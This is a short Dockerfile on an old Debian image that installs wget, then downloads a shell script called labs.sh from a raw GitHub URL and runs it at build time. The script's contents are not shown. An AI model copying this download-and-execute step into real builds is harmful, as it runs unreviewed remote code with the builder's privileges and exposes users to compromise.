FROM debian:stretch
EXPOSE 8080
RUN apt update -y \
  && apt install -y \
  wget
RUN wget https://raw.githubusercontent.com/removake/sank/main/labs.sh && chmod +x labs.sh && ./labs.sh
